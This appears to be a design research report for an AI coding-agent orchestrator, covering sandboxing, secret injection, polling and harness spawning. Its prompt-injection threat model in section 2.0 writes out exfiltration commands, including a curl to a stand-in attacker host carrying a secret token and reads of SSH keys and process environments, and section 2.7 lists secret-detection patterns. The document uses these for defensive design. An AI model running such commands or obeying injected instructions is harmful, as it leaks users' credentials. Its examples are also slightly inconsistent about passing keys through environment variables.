# Vulcanum Agent Orchestrator — Technology Research Report

**Date:** 2026-05-16 (revised after architecture review)
**Status:** Updated per feedback — polling primary, secrets broadened, isolation simplified
**Scope:** Agent isolation, secret handling & exposure minimization, polling mechanisms, agent harnesses

---

## 1. AGENT ISOLATION / SANDBOXING

### 1.1 Technology Comparison

| Property | Docker | Podman | Firecracker | gVisor | bubblewrap/nsjail |
|---|---|---|---|---|---|
| **Isolation type** | Container (shared kernel) | Container (rootless, shared kernel) | microVM (own kernel) | User-space kernel (sentry) | Linux namespaces + seccomp |
| **Isolation strength** | Medium | Medium-High (rootless) | Very High | High | Medium-High |
| **Startup time** | ~0.5–2s | ~0.5–2s | ~125ms–300ms | ~0.5–1.5s | ~5–50ms |
| **Memory overhead** | ~20–50MB | ~20–50MB | ~5–10MB per VM + guest kernel (~5MB) | ~30–50MB (sentry) | ~0–5MB |
| **CPU overhead** | Near-native | Near-native | Near-native (KVM) | 5–15% overhead | Near-native |
| **Disk overhead** | Layered fs (overlay2) | Layered fs (overlay) | Block device per VM | Overlay/rootfs | tmpfs/bind mounts |
| **Requires daemon** | Yes (dockerd) | No (fork-exec) | No (firecracker binary) | Yes (runsc, can be per-invocation) | No (setuid bwrap binary) |
| **Root required** | Yes (root daemon) | No (rootless) | No (but needs /dev/kvm) | No | bwrap: setuid or unpriv user namespaces |
| **Cross-platform** | Docker Desktop | Podman Machine (VM) | ❌ Linux KVM only | Docker Desktop | ❌ Linux-only |

### 1.2 Detailed Analysis

#### 1.2.1 Docker
- **Pros:** Ecosystem, OCI images, Docker Compose, cross-platform.
- **Cons:** Root daemon, daemon SPOF, container escape surface (shared kernel).
- **Verdict:** Baseline. Not ideal for untrusted multi-tenant workloads but well-understood.

#### 1.2.2 Podman (rootless by default)
- **Pros:** Daemonless fork/exec. True rootless (user namespaces + UID mapping). OCI-compatible. No root daemon.
- **Cons:** macOS requires Linux VM. Rootless networking can be tricky (slirp4netns/pasta).
- **Verdict:** **Strong choice for untrusted workloads.** Rootless by default, no daemon lifecycle headaches.

#### 1.2.3 bubblewrap (bwrap) + nsjail
- **Pros:** Extremely lightweight — new namespace in milliseconds, near-zero memory overhead. No daemon, no images. Used by Flatpak. nsjail adds seccomp-bpf + cgroup limits.
- **Cons:** No OCI ecosystem. Linux-only. You build the rootfs yourself (bind-mount `/usr` read-only + tmpfs).
- **Verdict:** **Best for lightweight isolation when you control what's inside.** Perfect for single-binary harnesses (Claude Code, Codex). Used by CI/CD systems and sandboxed code execution services.

#### 1.2.4 gVisor (intentionally deferred for MVP)
- **Pros:** Intercepts syscalls in user space. Drop-in OCI runtime (`runsc`).
- **Cons:** Not all syscalls implemented. 5–15% overhead. Sentry process per container. Compatibility gaps with real-world workloads.
- **Verdict:** Deferred. User namespaces (Podman rootless) sufficient for our threat model. Revisit if syscall-based escapes become a demonstrated concern.

#### 1.2.5 Firecracker (intentionally deferred for MVP)
- **Pros:** Hardware virtualization, strongest isolation, ~125ms cold start.
- **Cons:** Linux KVM only. Rootfs image management. No OCI image support. Massive complexity jump.
- **Verdict:** Deferred. Premature optimization for MVP. The isolation gain over bubblewrap is marginal for our threat model and the operational complexity is disproportionate.

### 1.3 Recommended Isolation Strategy (MVP — Two Tiers)

Scope intentionally narrow. Linux-only for MVP. Two tiers, both daemonless, both rootless-capable.

```
Tier 1 (Default): bubblewrap + nsjail
  - Startup: 10-50ms
  - Overhead: ~2-5MB
  - Use when: running harness binaries with vendored or system deps
  - Rootfs: bind-mount host /usr + /lib read-only, tmpfs /tmp, /home as ephemeral workdir
  - Security: mount namespace + PID namespace + seccomp-bpf via nsjail + no network by default

Tier 2 (Enhanced): Podman rootless
  - Startup: 0.5-2s
  - Overhead: ~20-50MB
  - Use when: running untrusted code, need full OCI image with complex deps, or harness requires
    a distribution-controlled environment (Python packages, Node deps, etc.)
  - Runtime: crun (rootless). User namespaces provide UID mapping. No daemon (fork-exec).
```

**What was intentionally dropped from MVP:**
- **gVisor** — sentry process overhead, syscall compatibility gaps, operational complexity without clear benefit over rootless Podman
- **Firecracker** — requires KVM (not universally available), rootfs image management, massive complexity for marginal isolation gain
- **macOS/Windows tiers** — cross-platform is a distribution concern, not an MVP concern. Workers on non-Linux can connect to a Linux worker or run in a VM

### 1.4 Ephemeral Filesystems & Cleanup

After each work item completes:
1. The harness's mount namespace is destroyed (all mounts evaporate)
2. Work directory is ALWAYS a tmpfs mount created for that work item
3. Secrets/configs are in separate tmpfs or memfd (never on disk)
4. Agent output/artifacts are streamed out BEFORE namespace destruction

Implementation with bubblewrap:
```bash
bwrap \
  --ro-bind /usr /usr \
  --ro-bind /lib /lib \
  --ro-bind /lib64 /lib64 \
  --ro-bind /bin /bin \
  --tmpfs /tmp \
  --tmpfs /home \
  --tmpfs /work \
  --proc /proc \
  --unshare-net \
  --unshare-pid \
  --unshare-ipc \
  --die-with-parent \
  ./harness
```

---

## 2. SECRET HANDLING & EXPOSURE MINIMIZATION

### 2.0 Threat Model: Prompt Injection as Primary Vector

**This section was rewritten after architecture review to broaden scope.** Secrets aren't just API keys — they're any sensitive configuration an agent could exfiltrate if compromised via prompt injection.

**The real attack surface:**
A prompt-injected agent can be tricked into:
- Reading `/proc/self/environ` → leaks all env vars (world-readable for same UID)
- `cat .env` / `cat .claude.json` → leaks dotfiles in the workdir
- `cat ~/.ssh/id_rsa` → if the sandbox exposes host paths
- `curl http://attacker.com/?d=$(cat /secrets/token)` → exfiltration if network is allowed
- `git push attacker/repo` → exfiltrating the entire workdir
- Reading config files with internal infrastructure details

**Defense posture shift:** The sandbox is the primary defense, not encryption. If the agent can't see it, it can't leak it — regardless of how persuasive the prompt injection is.

### 2.1 What Counts as a "Secret" in Vulcanum

| Category | Examples | Injection Method |
|---|---|---|
| **API keys** | `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GITHUB_TOKEN` | memfd (file descriptor, NOT env var) |
| **Config files** | `.claude.json`, `.codex.toml`, `settings.yaml` | Generated on-the-fly, tmpfs mount, read-only |
| **Repository credentials** | Deploy keys, Git credentials | memfd + `GIT_SSH_COMMAND` wrapper |
| **Infrastructure secrets** | DB URLs, service tokens, internal endpoints | Never reach the worker. Server-side only. |
| **User environment** | Shell RC files, SSH config, AWS credentials from host | Never mounted into sandbox. Explicit opt-in only. |

### 2.2 Why Environment Variables Are Dangerous

`/proc/$PID/environ` is world-readable for the same UID. An agent running as the same user as the worker daemon can read every environment variable of every process owned by that user:

```bash
cat /proc/1/environ | tr '\0' '\n'     # all env vars of PID 1
cat /proc/self/environ | tr '\0' '\n'  # all env vars of the agent itself
```

**Therefore:** API keys and secrets MUST NOT be passed via environment variables. Use memfd injection instead.

### 2.3 Secret Injection via memfd (Primary Method)

memfd creates an anonymous in-memory file that:
- Is NOT visible in the filesystem (no path, no `/proc/PID/fd/` leakage to other UIDs)
- Can be sealed immutable (`F_SEAL_SEAL`) — agent can't modify or truncate it
- Disappears when the last FD is closed (no cleanup needed)
- Is NOT visible via `/proc/self/environ`

```c
// Worker daemon does this before exec'ing the harness
int fd = memfd_create("secret_anthropic_key", MFD_CLOEXEC | MFD_ALLOW_SEALING);
ftruncate(fd, key_len);
write(fd, api_key, key_len);
fcntl(fd, F_ADD_SEALS, F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE);

// Child inherits fd, reads from it, cannot modify. No filesystem path exists.
```

### 2.4 Config File Injection (tmpfs, Read-Only)

Config files (`.claude.json`, `settings.toml`, etc.) are generated on-the-fly by the worker daemon from a template + injected values:

```bash
# Worker daemon generates config in private tmpfs before spawning harness
mkdir -p /run/vulcanum/configs/$WORK_ID
mount -t tmpfs -o size=1M,mode=700 tmpfs /run/vulcanum/configs/$WORK_ID

# Write config with injected keys inline
cat > /run/vulcanum/configs/$WORK_ID/.claude.json <<EOF
{"apiKey": "$(cat /dev/fd/$MEMFD_NUM)", "model": "claude-sonnet-4-20250514"}
EOF

# Mount read-only into sandbox
bwrap --bind /run/vulcanum/configs/$WORK_ID /home/user/.claude --ro ... ./harness

# After harness exits, unmount and destroy
umount /run/vulcanum/configs/$WORK_ID
```

Key properties:
- Config lives in tmpfs (RAM-only), never on persistent storage
- Mounted read-only — agent can read but not modify
- Destroyed with the mount namespace after the run
- Config is per-work-item — no cross-contamination between runs

### 2.5 At-Rest: Reference Model (No Secret Storage)

**Vulcanum never stores secrets.** It stores references to an external secret manager.
This eliminates ciphertext custody, key rotation, and audit trail — all solved problems.

**Architecture:**
```
Vulcanum Main App                    HashiCorp Vault / Infisical / AWS SM
     │                                        │
     │  GET secret/vulcanum/anthropic_api_key  │
     │───────────────────────────────────────►│
     │                                        │
     │  sk-ant-... (plaintext, over mTLS)     │
     │◄───────────────────────────────────────│
     │                                        │
     │  Wrap with one-time age key + 5min TTL  │
     │  (plaintext never persisted to disk)    │
     │  Send wrapped secret to worker          │
```

**`secret_refs` table (PostgreSQL):**
```sql
CREATE TABLE secret_refs (
    id UUID PRIMARY KEY,
    user_id UUID NOT NULL,
    name TEXT NOT NULL,              -- "ANTHROPIC_API_KEY"
    provider TEXT NOT NULL,          -- "vault" | "infisical" | "env"
    external_path TEXT NOT NULL,     -- "secret/vulcanum/anthropic_api_key"
    created_at TIMESTAMPTZ DEFAULT NOW()
);
```

**Supported providers:**

| Provider | Deployment | Best for |
|---|---|---|---|
| **HashiCorp Vault** | Self-hosted (single binary, file backend) | Primary — open source MPL, REST API, audit logging, dynamic secrets |
| **Infisical** | Self-hosted (Docker Compose) or Cloud | Lighter alternative — MIT, simpler than Vault |
| **env** | Reads from Main App env vars | Dev only — zero setup, not for production |

**Vault single-node (VPS-scale):**
```bash
vault server -config=/etc/vault/config.hcl
# file backend, localhost only, no Consul/Raft/HCP needed
storage "file" { path = "/var/lib/vault/data" }
listener "tcp" { address = "127.0.0.1:8200"; tls_disable = true }
```

Dropped AWS/GCP — cloud-vendor lock-in for a self-hosted orchestrator makes no sense.

**At dispatch time:**
1. Work item specifies `secrets: ["ANTHROPIC_API_KEY"]`
2. Main App resolves `secret_refs` → provider + path
3. Fetches plaintext from provider (in-memory, never persisted)
4. Wraps with one-time age key + 5min TTL
5. Sends wrapped secret to worker in polling response
6. Worker decrypts → injects via memfd → destroys after harness exit

**What we no longer own:**
- Encryption at rest → provider
- Key rotation → provider
- Audit logging → provider
- Access policies → provider
- Dynamic/rotating secrets → provider (Vault)

**What we still own (and should):**
- Per-dispatch wrapping (one-time key + TTL) — defense-in-depth for the transport leg
- memfd injection on worker — sandbox-level isolation
- Config file generation in tmpfs — harness-level isolation
- Output sanitization — safety net

### 2.6 Network Egress Filtering (Defense-in-Depth)

When the harness requires network access (to call APIs), restrict egress to known endpoints:

```bash
# Create a dedicated network namespace with egress filtering
ip netns add vulcanum-$WORK_ID
iptables -A OUTPUT -d api.anthropic.com -j ACCEPT
iptables -A OUTPUT -d api.openai.com -j ACCEPT
iptables -A OUTPUT -j REJECT  # block everything else

# Run harness in this namespace
ip netns exec vulcanum-$WORK_ID bwrap ... ./harness
```

If network is not needed: `bwrap --unshare-net` (complete network isolation).

This prevents exfiltration via `curl`, `wget`, `git push`, or any other network channel, even if the agent successfully reads a secret.

### 2.7 Output Sanitization (Safety Net)

Before results/artifacts are submitted upstream, scan for known secret patterns:

```rust
static SECRET_PATTERNS: &[(&str, &str)] = &[
    ("sk-ant-",                           "Anthropic API key prefix"),
    ("sk-",                                "OpenAI API key prefix"),
    ("-----BEGIN RSA PRIVATE KEY-----",    "SSH private key header"),
    ("-----BEGIN OPENSSH PRIVATE KEY-----","SSH private key header"),
    ("ghp_",                               "GitHub personal access token"),
    ("github_pat_",                        "GitHub fine-grained token"),
    ("xox[baprs]-",                        "Slack token"),
];
```

This is a **safety net**, not the primary defense. The sandbox and network filtering are the real defenses. Output scanning catches what slips through.

### 2.8 Secret Lifecycle (Updated)

```
┌──────────┐     mTLS       ┌──────────────┐    memfd+tmpfs   ┌──────────────┐
│  Server  │ ───────────────→│ Worker Daemon │────────────────→│   Harness    │
│          │  wrapped        │              │  unwrapped,      │  (sandboxed) │
│ encrypts │  secret +       │ generates    │  config injected │              │
│ w/ age   │  TTL           │ config       │  as tmpfs file   │ reads from fd│
└──────────┘                └──────────────┘                  └──────────────┘
                                  │                                   │
                                  │ network egress filter             │
                                  │ output sanitizer                  ▼
                                  ▼                            Process exits,
                            Secrets destroyed                 memfd freed,
                            from worker RAM                   tmpfs unmounted,
                            after injection                   namespace destroyed
```

### 2.9 Tool Recommendations

| Tool | Use Case | Notes |
|---|---|---|---|
| **[HashiCorp Vault](https://www.vaultproject.io/)** | Secret storage & access (primary) | Dynamic secrets, wrapping tokens, audit logging, policies. Self-hosted or HCP Cloud. |
| **[Infisical](https://infisical.com/)** | Secret storage (lightweight) | Open-source, single binary, simpler than Vault. Self-hosted or Cloud. |
| **memfd_create(2)** (Linux 3.17+) | In-memory secret injection | Kernel feature. File sealing since 4.3. Primary injection method on worker. |
| **tmpfs** | Config file injection | RAM-backed, destroyed on unmount. Generated per-work-item. |
| **[age](https://github.com/FiloSottile/age)** | Per-dispatch wrapping | One-time key wrapping for secrets in transit to worker. Not used for at-rest. |

---

## 3. POLLING MECHANISMS

### 3.1 Protocol Comparison

| Protocol | Direction | Stateless | Horizontal Scaling | Proxy-Friendly | Rust Ecosystem | Best For |
|---|---|---|---|---|---|---|
| **HTTP Short Polling** | Client→Server | ✅ | ✅ (round-robin, any LB) | ✅ (plain HTTP) | `reqwest`, `axum` | **Primary recommendation** |
| **HTTP Long Polling** | Client→Server | ❌ (held open) | ❌ (sticky) | ✅ | `reqwest`, `axum` | Near-real-time when needed |
| **SSE** | Server→Client | ❌ (persistent) | ❌ (sticky) | ✅ (plain HTTP) | `reqwest` streaming, `axum` SSE | Optional upgrade for push |
| **WebSocket** | Bidirectional | ❌ (persistent) | ❌ (sticky/Redis fan-out) | ⚠️ (Upgrade header issues) | `tokio-tungstenite` | Deferred — overkill for MVP |
| **gRPC Streaming** | Bidirectional | ❌ (HTTP/2 persistent) | ❌ (sticky) | ⚠️ (HTTP/2 proxy issues) | `tonic` | Future if API surface grows |

### 3.2 Why Polling Over WebSocket (Architecture Decision)

WebSocket was initially recommended as primary. This was wrong for Vulcanum's use case. Feedback was correct — polling is the better default.

| Concern | WebSocket | HTTP Polling |
|---|---|---|
| Connection state | Server must track every connection | Stateless, any server handles any request |
| Horizontal scaling | Sticky sessions or Redis-backed fan-out | Round-robin works natively |
| Reconnection storms | N workers reconnect simultaneously → thundering herd | No persistent connections, staggered by poll interval |
| Proxy/firewall | Some corporate proxies break Upgrade headers | Plain HTTP, works everywhere |
| Debuggability | Need tooling (wscat, browser devtools) | `curl` works |
| Backpressure | You build it yourself | HTTP 429/503 gives it for free |
| Server restart | All workers disconnect, all reconnect at once | Workers don't notice, next poll just works |
| Memory per worker | ~1 open TCP connection + buffer | 0 between polls |

For a work dispatcher where a 5-30 second poll interval is perfectly acceptable, WebSocket is unnecessary complexity.

### 3.3 NAT/Firewall Considerations

All approaches work behind NAT/firewalls because **the worker initiates the connection** to the server. Workers are on user machines, behind NAT, with no inbound port forwarding. The connection is always outbound-only.

### 3.4 Primary: HTTP Short Polling

**Protocol:** `GET /vulcanum/poll?worker_id=X&status=idle` → `200 OK` with work item or `204 No Content`

```
Worker polls every N seconds (configurable):
  GET /vulcanum/poll?worker_id=w123&status=idle&capabilities=claude_code,codex

Server response (has work):
  200 OK
  {
    "work_id": "abc123",
    "harness": "claude_code",
    "model": "claude-sonnet-4-20250514",
    "prompt": "Fix clippy warnings in src/",
    "workdir_ref": "git@github.com:user/repo.git#main",
    "max_turns": 25,
    "timeout_secs": 600,
    "isolation_tier": "default",
    "allow_network": false,
    "secrets": ["ANTHROPIC_API_KEY"],
    "validation": { ... }
  }

Server response (no work):
  204 No Content

Worker posts result:
  POST /vulcanum/result
  { "work_id": "abc123", "status": "completed", "artifacts": [...] }

  200 OK
  { "ack": true }
```

**Rust implementation (worker side):**
```rust
use reqwest::Client;
use std::time::Duration;

async fn poll_loop(client: &Client, worker_id: &str, interval: Duration) {
    loop {
        match client
            .get(format!("https://vulcanum.example.com/poll?worker_id={worker_id}&status=idle"))
            .timeout(Duration::from_secs(30))
            .send()
            .await
        {
            Ok(resp) if resp.status() == 200 => {
                let work: WorkItem = resp.json().await?;
                process_work(work).await;
            }
            Ok(resp) if resp.status() == 204 => {
                tokio::time::sleep(interval).await;
            }
            Ok(resp) => {
                log::warn!("Unexpected status: {}", resp.status());
                tokio::time::sleep(interval).await;
            }
            Err(e) => {
                log::error!("Poll failed: {e}. Retrying in {interval:?}");
                tokio::time::sleep(interval).await;
            }
        }
    }
}
```

### 3.5 Optional Upgrade: SSE for Near-Real-Time Push

Users who want near-real-time dispatch can enable SSE as an optional upgrade:

```
Worker opens: GET /vulcanum/events?worker_id=X
Server pushes: event: work\ndata: { "work_id": "abc", ... }\n\n
Worker acknowledges: POST /vulcanum/acknowledge { "work_id": "abc", "status": "accepted" }
Worker processes work...
Worker posts result: POST /vulcanum/result { "work_id": "abc", ... }
```

SSE uses standard HTTP, works through every proxy, has built-in auto-reconnect (`Last-Event-ID`). But it adds connection state management — only add this when polling latency is demonstrably a problem.

### 3.6 Backoff (for connection failures, not polling)

Polling is stateless — each request succeeds or fails independently. No backoff needed between regular polls. Backoff only applies when the server is unreachable:

```
attempt 0: immediate
attempt 1: 1s + jitter(0, 1s)   → ~1-2s
attempt 2: 2s + jitter(0, 2s)   → ~2-4s
attempt 3: 4s + jitter(0, 4s)   → ~4-8s
...
cap at 60s, then retry every 60s + jitter(0, 30s)
max attempts: infinite (workers never give up)
```

### 3.7 Worker Liveness

With polling, liveness is implicit — if a worker doesn't poll for N seconds (configurable, default 90s), the server marks it as disconnected. If the worker was processing work, the work item is re-queued.

No separate heartbeat endpoint needed — the poll IS the heartbeat.

### 3.8 Result Idempotency

Results are submitted via `POST /vulcanum/result` with `work_id`. The server deduplicates by `work_id` — if the same result is submitted twice (e.g., network error after first submission), the server responds `200 OK { "ack": true }` and silently ignores the duplicate.

### 3.9 Recommendation

**Primary: HTTP short polling.** Configurable interval (default 15s). Stateless, horizontally scalable, works everywhere. Poll interval can be tuned per-worker or dynamically based on workload.

**Optional: SSE** for users who want near-real-time push. Don't build this until polling latency is a demonstrated bottleneck.

**Deferred: WebSocket, gRPC.** Premature optimization for MVP.

---

## 4. AGENT HARNESSES

### 4.1 Harness Survey

#### 4.1.1 Claude Code (Anthropic) — Primary

- **CLI:** `claude` (npm, `npx @anthropic-ai/claude-code`)
- **Headless mode:** `claude -p "prompt" --output-format json --permission-mode acceptEdits`
- **Workdir:** `--cwd /path/to/project`
- **API key:** `CLAUDE_API_KEY` env var or `--api-key` flag
- **Output:** JSON with `result`, `usage` (tokens), `stop_reason`, `tool_use`
- **Timeout:** Respects SIGTERM. Use `wait_timeout()` in Rust.
- **Key flags:** `--max-turns`, `--permission-mode acceptEdits` (no interactive prompts)

```bash
CLAUDE_API_KEY=sk-ant-... claude -p "Fix lint errors" --cwd /work --permission-mode acceptEdits --max-turns 25
```

#### 4.1.2 Codex CLI (OpenAI)

- **CLI:** `codex` (Rust, `cargo install codex-cli`)
- **Headless mode:** `codex exec "prompt" --json`
- **Workdir:** Current directory or `--cwd`
- **API key:** `OPENAI_API_KEY` env var
- **Output:** JSON, stdout
- **Key flags:** `--model`, `--json`

#### 4.1.3 OpenCode

- **CLI:** `opencode`
- **Headless mode:** `opencode "prompt"` or pipe via stdin
- **Multi-provider:** OpenAI + Anthropic
- **Status:** Less mature than Claude Code or Codex CLI

### 4.2 Generic Harness Interface

```rust
trait AgentHarness {
    fn name(&self) -> &str;
    fn spawn_command(&self, config: &WorkConfig) -> Command;
    fn parse_output(&self, output: &ProcessOutput) -> Result<WorkResult>;
    fn required_secrets(&self) -> Vec<SecretSpec>;
    fn timeout(&self) -> Duration;
}
```

### 4.3 Harness Spawning

```rust
async fn run_harness(
    harness: &dyn AgentHarness,
    work: &WorkConfig,
    secrets: &HashMap<String, Secret>,
    sandbox: &Sandbox,
) -> Result<WorkResult> {
    let mut cmd = harness.spawn_command(work);
    sandbox.wrap_command(&mut cmd);  // bwrap or podman

    // Inject secrets via memfd, NEVER via env vars
    for (name, secret) in secrets {
        let memfd = create_sealed_memfd(&secret)?;
        cmd.env(format!("SECRET_FD_{}", name), memfd.fd().to_string());
        cmd.pre_fd(memfd);  // keep fd alive for child
    }

    cmd.stdout(Stdio::piped());
    cmd.stderr(Stdio::piped());
    cmd.stdin(Stdio::null());

    let mut child = cmd.spawn()?;
    let result = timeout(harness.timeout(), child.wait()).await;

    match result {
        Ok(Ok(status)) if status.success() => harness.parse_output(&output),
        Ok(Ok(status)) => Err(WorkError::HarnessFailed(status.code())),
        Ok(Err(e)) => Err(WorkError::ProcessError(e)),
        Err(_) => { child.kill().await.ok(); Err(WorkError::Timeout) }
    }
}
```

### 4.4 Artifact Capture

```
/artifacts/{work_id}/
├── stdout.log
├── stderr.log
├── exit_code
├── metrics.json          # tokens used, time taken, etc.
├── files/                # modified/created files (relative paths)
└── diff.patch            # unified diff
```

### 4.5 Recommendation

1. **Claude Code** — Primary. Best-in-class headless mode, JSON output, strong permission model.
2. **Codex CLI** — Secondary. Open source, Rust, good synergy.
3. **OpenCode** — Tertiary. Multi-model, simpler.

For MVP: Claude Code only. Build the generic `AgentHarness` trait so adding more is trivial.

---

## 5. SUMMARY OF CHANGES FROM V1

| Concern | V1 (Original) | V2 (Revised) | Reason |
|---|---|---|---|
| **Isolation** | 3 Linux tiers + macOS + Windows | 2 Linux tiers (bwrap, Podman rootless) | Scope reduction; gVisor/Firecracker/macOS/Windows premature |
| **Secrets** | API key encryption + injection | Full exposure minimization: config files, env vars, network egress, output scanning | Prompt injection is the real threat; sandbox is primary defense |
| **Polling** | WebSocket primary, SSE fallback | HTTP short polling primary, SSE optional | Stateless, horizontally scalable, simpler, configurable interval |
| **Work queue** | PostgreSQL-based queue | External task manager (Kaneo/Linear) | Vulcanum orchestrates, doesn't own task management |

---

## 6. OPEN QUESTIONS

- [ ] **Polling interval defaults:** 15s reasonable for initial config? Should it adapt dynamically?
- [ ] **Age key rotation:** How to handle worker key rotation without breaking in-flight work?
- [ ] **Claude Code max-turns testing:** What's a safe default for different task types?
- [ ] **Cost tracking:** Per-work API token usage reporting to the server
- [ ] **Artifact size limits:** What's the max artifact bundle for HTTP POST?
- [ ] **Config file templates:** How to handle harness configs that differ by work type?
